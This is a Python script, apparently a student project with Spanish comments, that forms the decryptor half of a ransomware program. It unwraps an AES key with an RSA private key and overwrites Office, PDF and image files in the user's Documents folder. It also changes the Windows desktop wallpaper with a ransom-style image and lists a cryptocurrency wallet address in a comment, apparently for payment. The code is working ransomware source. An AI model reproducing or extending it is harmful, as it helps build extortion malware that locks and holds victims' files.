#!/usr/bin/env python3

import os, base64, json, scrypt, gc, ctypes, requests
from Crypto.Cipher import AES
from Crypto.PublicKey  import  RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes

def string_to_byte(temp):
    return bytes(temp, encoding="UTF-8")


# funcion AES para descifrar
def decrypt_AES_GCM(archivo):
    aesCipher = AES.new(secretKey, AES.MODE_GCM, iv)
    archivo_decripted = aesCipher.decrypt(archivo)
    return archivo_decripted

# importar archivos de %UserProfile%\Documents 
ejemplo_dir = os.path.join(os.environ['USERPROFILE'], "Documents")
contenido = os.listdir(ejemplo_dir)
archivos = []
for fichero in contenido:
    if os.path.isfile(os.path.join(ejemplo_dir, fichero)) and (fichero.endswith('.docx') or fichero.endswith('.xlsx') or fichero.endswith('.pdf') or fichero.endswith('.jpeg') or fichero.endswith('.jpg')):
        archivos.append(fichero)
print(archivos)

data={}
# leer llave AES cifrado con RSA
with open('credenciales.json', 'r') as file:
    data = json.load(file)["credenciales"][0]

with open('llave_privada.pem', 'rb') as priv:
    llave_privada=PKCS1_OAEP.new(RSA.importKey(priv.read()))
    #llave_privada=PKCS1_OAEP.new(priv.read())

    print(type(llave_privada),llave_privada)

#password= llave_privada.decrypt(base64.b64decode(data["password"]))
#password= llave_privada.decrypt(base64.b64decode(data["password"].encode("utf-8")))
#password_salt= llave_privada.decrypt(base64.b64decode(data["password_salt"]))
iv= llave_privada.decrypt(base64.b64decode(data["iv"]))
secretKey= llave_privada.decrypt(base64.b64decode(data["llave_aes"]))

    
for archivo in archivos:
    archivo_cifrado = open(os.path.join(os.environ['USERPROFILE'], "Documents",archivo), 'rb')
    archivo_bytes = bytearray(archivo_cifrado.read())
    temp = decrypt_AES_GCM(archivo_bytes)
    
    #print(temp)
    archivo_descifrado = temp
    archivo_destino = open(os.path.join(os.environ['USERPROFILE'], "Documents", archivo), "wb")
    archivo_destino.write(archivo_descifrado)

    archivo_cifrado.close()
    archivo_destino.close()





# borrar memoria RAM
del temp
gc.collect()

# borar archivos originales
import shutil
dirPath = 'archivos_originales/'
try:
    pass
    #shutil.rmtree(dirPath)
except OSError as e:
    print(f"Error:{ e.strerror}")

# cambiar el fondo de escritorio    
path = b'C:\\Users\\qwert\\proyecto_final\\fondo.jpg'
ctypes.windll.user32.SystemParametersInfoA(20, 0, path, 3)

# hacer programa de descifrado

# wallet
# 3QvVW4j9ZMneSFJVCnHDa7Ce3tpcrNieuF

# documentacion